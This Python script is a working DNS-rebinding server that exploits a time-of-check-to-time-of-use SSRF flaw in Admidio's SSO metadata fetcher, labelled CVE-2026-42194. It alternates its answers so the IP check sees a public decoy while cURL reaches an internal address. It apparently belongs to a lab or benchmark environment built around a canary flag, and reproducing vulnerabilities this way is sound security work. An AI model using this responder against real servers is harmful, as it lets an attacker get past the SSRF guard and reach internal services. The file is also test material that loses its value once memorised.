#!/usr/bin/env python3
"""Deterministic DNS-rebinding responder for admidio-cve-2026-42194 (CVE-2026-42194 TOCTOU).

A tiny UDP DNS server (no deps) that makes Admidio's SSO-metadata SSRF guard's CHECK-time
lookup and cURL's FETCH-time lookup disagree for the SAME hostname `rebind.pcb.test` — the
exact time-of-check-to-time-of-use gap that CVE-2026-42194 (GHSA-hcjj-chvw-fmw9) exploits.

Real sink (modules/sso/fetch_metadata.php, V1 = Admidio 5.0.7/5.0.8):
    $host = parse_url($url, PHP_URL_HOST);
    $ip   = gethostbyname($host);                              // <-- CHECK  (A-query #1)
    if filter_var($ip, ..., NO_PRIV_RANGE|NO_RES_RANGE) === false -> reject
    $ch = curl_init($url);                                     // <-- FETCH  (A-query #2)
    ...                                                        //     NO CURLOPT_RESOLVE pinning

Zones:
  seed.pcb.test    -> ALWAYS 10.99.0.192 (the internal canary IP; PHP marks it private -> V1
                      IP-check rejects it. This is the ORIGINAL CVE-2026-32812 direct-SSRF seed).
  rebind.pcb.test  -> REBINDS per A-query, keyed by CLIENT IP:
                        odd  A-query (the guard's gethostbyname CHECK) -> 198.51.100.50 (decoy,
                              a PUBLIC IP that passes PHP's NO_PRIV_RANGE|NO_RES_RANGE filter)
                        even A-query (libcurl's FETCH resolve)          -> 10.99.0.192 (canary,
                              the internal service the guard is meant to block)
  anything else    -> NODATA / NXDOMAIN.

Why per-client-IP alternation is deterministic:
  On V1 every metadata fetch of rebind.pcb.test does EXACTLY two A lookups in order from the
  same Admidio container: (1) gethostbyname() CHECK  (2) libcurl FETCH. So the guard always
  sees the odd answer (decoy 198.51.100.50 -> passes the private/reserved filter) and cURL
  always sees the even answer (canary 10.99.0.192) -> SSRF to the internal canary.
  Keying the counter by client IP keeps the V0/V1/V2 containers independent. gethostbyname()
  is IPv4-only (1 A query); libcurl does A + AAAA, and AAAA (type 28) is answered NODATA so no
  extra A query is emitted -> the two A-queries keep exact CHECK/FETCH parity. TTL=0 defeats
  caching. The DB is reached by STATIC IP so it never touches this resolver.
"""
import socket
import struct
import sys
import threading

CANARY_IP = "10.99.0.192"       # internal service (PHP FILTER: private) serving ${PCB_FLAG} over TLS
DECOY_IP = "198.51.100.50"      # PUBLIC IP the guard's CHECK is allowed to accept (no flag here)

_lock = threading.Lock()
_counter = {}  # client_ip -> number of A queries seen for rebind.pcb.test


def _parse_qname(data, offset):
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        labels.append(data[offset + 1: offset + 1 + length].decode("ascii", "replace"))
        offset += 1 + length
    return ".".join(labels), offset


def _answer_ip_for(qname, qtype, client_ip):
    """Return the IPv4 string to answer with, or None for NODATA/NXDOMAIN."""
    q = qname.lower().rstrip(".")
    if qtype != 1:  # not an A query -> NODATA (so AAAA doesn't trigger extra A lookups)
        return None
    if q == "seed.pcb.test":
        return CANARY_IP
    if q == "rebind.pcb.test":
        with _lock:
            n = _counter.get(client_ip, 0) + 1
            _counter[client_ip] = n
        # odd = CHECK (gethostbyname) -> decoy passes filter ; even = FETCH (curl) -> canary
        ip = DECOY_IP if (n % 2 == 1) else CANARY_IP
        role = "CHECK->decoy" if (n % 2 == 1) else "FETCH->canary"
        print(f"[dns] rebind.pcb.test A #{n} from {client_ip} -> {ip} ({role})", flush=True)
        return ip
    return None


def _build_response(data, client_ip):
    tid = data[:2]
    flags = 0x8180  # standard query response, no error
    offset = 12
    qname, offset = _parse_qname(data, offset)
    qtype, qclass = struct.unpack(">HH", data[offset: offset + 4])
    offset += 4
    question = data[12:offset]

    ip = _answer_ip_for(qname, qtype, client_ip)
    if ip is None:
        header = tid + struct.pack(">HHHHH", flags, 1, 0, 0, 0)  # NODATA
        return header + question

    header = tid + struct.pack(">HHHHH", flags, 1, 1, 0, 0)
    answer = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 0, 4) + socket.inet_aton(ip)
    return header + question + answer


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 53))
    print("[dns] rebinding responder up on 0.0.0.0:53", flush=True)
    while True:
        try:
            data, addr = sock.recvfrom(512)
            if len(data) < 12:
                continue
            resp = _build_response(data, addr[0])
            sock.sendto(resp, addr)
        except Exception as e:  # noqa: BLE001
            print(f"[dns] error: {e}", file=sys.stderr, flush=True)


if __name__ == "__main__":
    main()
